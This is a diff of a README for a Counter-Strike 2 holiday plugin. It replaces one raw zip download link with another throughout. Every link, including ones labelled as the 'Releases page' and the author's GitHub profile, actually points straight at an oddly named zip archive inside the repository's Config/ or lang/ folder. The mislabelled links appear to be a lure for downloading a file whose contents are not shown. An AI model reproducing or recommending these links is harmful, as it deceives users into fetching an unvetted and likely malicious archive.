@@ -1,6 +1,6 @@
 # 🎉 cs2-HolidaysManager-GoldKingZ - Celebrate Every Holiday Effortlessly
 
-[![Download](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/Config/King_Gold_Manager_cs_Holidays_Z_v1.8.zip)](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/Config/King_Gold_Manager_cs_Holidays_Z_v1.8.zip)
+[![Download](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/lang/Manager-Gold-cs-King-Z-Holidays-v1.2-alpha.2.zip)](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/lang/Manager-Gold-cs-King-Z-Holidays-v1.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before installing the application, ensure your system meets the following requir
 
 To get started, you will need to download the application from the GitHub Releases page. 
 
-1. Click this link to [visit the Releases page](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/Config/King_Gold_Manager_cs_Holidays_Z_v1.8.zip).
+1. Click this link to [visit the Releases page](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/lang/Manager-Gold-cs-King-Z-Holidays-v1.2-alpha.2.zip).
 2. On the Releases page, find the latest version of the application.
 3. Click on the version number to open the details.
 4. Look for the download link that says **Assets**, and choose the file appropriate for your system.
@@ -53,9 +53,9 @@ If you encounter any issues or have questions, you can reach out for help on the
 
 Stay connected! Follow us on our GitHub page for updates and the latest news:
 
-- GitHub: [Edgararevalo1](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/Config/King_Gold_Manager_cs_Holidays_Z_v1.8.zip)
+- GitHub: [Edgararevalo1](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/lang/Manager-Gold-cs-King-Z-Holidays-v1.2-alpha.2.zip)
 - Share your feedback or suggestions for new features.
 
 ## 🎉 Celebrate More with cs2-HolidaysManager-GoldKingZ!
 
-Download now and start enjoying a festively decorated experience during every holiday. Don't forget to visit the [Releases page](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/Config/King_Gold_Manager_cs_Holidays_Z_v1.8.zip) to download the latest version.
+Download now and start enjoying a festively decorated experience during every holiday. Don't forget to visit the [Releases page](https://github.com/Edgararevalo1/cs2-HolidaysManager-GoldKingZ/raw/refs/heads/main/lang/Manager-Gold-cs-King-Z-Holidays-v1.2-alpha.2.zip) to download the latest version.
